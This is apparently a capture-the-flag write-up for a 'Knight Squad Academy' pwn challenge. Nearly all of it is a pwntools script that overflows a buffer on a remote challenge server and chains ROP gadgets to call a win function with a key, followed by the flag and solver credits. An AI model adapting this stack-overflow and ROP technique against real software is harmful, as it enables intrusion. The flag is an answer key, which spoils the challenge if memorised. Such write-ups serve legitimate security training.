# pwn&jail - Knight Squad Academy

```
from pwn import *

# Set up the target
# p = process('./ksa_kiosk') # Local testing
p = remote('66.228.49.41', 5000) # Remote target

# --- Exploit Configuration ---
offset = 120
pop_rdi = 0x40150b          # The gadget you found
win_func = 0x4013AC         # The function that prints the flag
key = 0x1337C0DECAFEBEEF    # The required argument for the win function
ret_gadget = 0x40101a       # A simple 'ret' instruction for stack alignment

# --- Execution ---

# 1. Navigate the Menu: Select "Register cadet"
p.sendlineafter(b'> ', b'1')

# 2. Handle "Cadet name"
# We just send a normal name here to get to the vulnerable part.
p.sendlineafter(b'Cadet name:\n', b'SirPwnsALot')

# 3. Construct the Payload
# We use the 'ret_gadget' to ensure the stack is 16-byte aligned.
# If the exploit crashes, try removing the 'p64(ret_gadget)' line.
payload = b"A" * offset
payload += p64(ret_gadget)  # Align stack (avoid MOVAPS crash in glibc)
payload += p64(pop_rdi)     # Load the next value into RDI
payload += p64(key)         # The secret value 0x1337C0DECAFEBEEF
payload += p64(win_func)    # Jump to the win function

print(f"[*] Sending payload...")
p.sendafter(b'> ', payload)

# 4. Receive the Flag
# We switch to interactive mode to see the output
p.interactive()
```
Flage: `KCTF{_We3Lc0ME_TO_Knight_SquadAcademy}`

Solved by: Ha1qal

Solved by: yappare